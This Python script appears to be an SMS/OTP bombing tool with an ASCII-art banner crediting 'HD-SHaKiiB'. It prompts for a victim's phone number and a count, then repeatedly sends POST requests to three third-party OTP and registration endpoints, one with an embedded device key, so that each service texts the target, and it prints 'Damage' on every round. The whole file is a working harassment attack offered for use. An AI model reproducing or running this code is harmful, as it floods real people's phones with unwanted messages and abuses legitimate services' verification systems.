import requests
from requests.structures import CaseInsensitiveDict

green = '\033[1;32m'
end = '\033[0m'
print (green+"""  _______ _    _ _  _____                                         
 |__   __| |  | (_)/ ____|                                        
    | |  | |__| |_| (___                                          
    | |  |  __  | |\___ \                                         
    | |  | |  | | |____) |                                        
   _|_|_ |_|  |_|_|_____/____   __  __                            
  / ____|      / ____|__   __| |  \/  |                           
 | (___  _   _| (___    | | ___| \  / |                           
  \___ \| | | |\___ \   | |/ _ \ |\/| |                           
  ____) | |_| |____) |  | |  __/ |  | |                           
 |_____/ \__, |_____/___|_|\___|_|  |_|                           
  / ____| __/ |     |__   __|                                     
 | |     |___/___  __ _| | ___  _ __                              
 | |    | '__/ _ \/ _` | |/ _ \| '__|                             
 | |____| | |  __/ (_| | | (_) | |                                
  \_____|_|  \___|\__,_|_|\___/|_|                                
 |  _ \                                                           
 | |_) |_   _                                                     
 |  _ <| | | |                                                    
 | |_) | |_| |                                                    
 |____/ \__, |                                                    
         __/ |                                                    
   __  _|___/ _____         _____ _    _       _  ___ ____   __   
  / / | |  | |  __ \       / ____| |  | |     | |/ (_)  _ \  \ \  
 | |  | |__| | |  | |_____| (___ | |__| | __ _| ' / _| |_) |  | | 
 | |  |  __  | |  | |______\___ \|  __  |/ _` |  < | |  _ <   | | 
 | |  | |  | | |__| |      ____) | |  | | (_| | . \| | |_) |  | | 
 | |  |_|  |_|_____/      |_____/|_|  |_|\__,_|_|\_\_|____/   | | 
  \_\                                                        /_/  
                                                                  """+end)

# CVALUE
blue = '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan = "\033[96m"
end = '\033[0m'
print ("\033[32m")

print ("	 -!-!- WeLcOmE-!-!- ( HD-SHaKiiB ) ( GhOsToFKiinG ) ")

number  = str(input("[>] Heii Mr : SHaKiiB Sir. apNar aTTack NumBer DiN: "))

amount = int(input("[>] Sir apNar aTTack ar PoriMaN LikHuN: "))
 

url5 = "https://addabaji.mobi/twocups-v1-robi/otp.php"

headers5 = CaseInsensitiveDict()
headers5["Content-Type"] = "application/x-www-form-urlencoded"

data5 = "msisdn="+number

url6 = "http://13.250.248.255/ami_probashi_api_v6/api/v3/bn/registration/send_otp?api_test=true&device_type=1&device_key=fBxnlOZCTY-WRWXOSheo4w%3AAPA91bFtpzsXyJlrH1QtPJWeic5xdKBw6x46MfK1h7rvUuE7RI8HJlgoPjK5KkuMr6XAcwuvIr9eM9f6SY7b5kBl2VnZnKPXQ4U3YJfqAo7QyUJjSZ9jW_b27AxJEEaTsVoknTebNLls&username=%2B88"+number+"&confirmation=create_new_account"

url8 = "https://api.meenaclick.com/api/front/sms/send/pin?'"

headers8 = CaseInsensitiveDict()
headers8["Content-Type"] = "application/x-www-form-urlencoded"

data8 = "cell_phone="+number

for i in range(amount):
	
	resp5 = requests.post(url5, headers=headers5, data=data5)
	
	resp6 = requests.post(url6)
	
	resp8 = requests.post(url8, headers=headers8, data=data8)

	print(str (i+1)+" Damage \n")
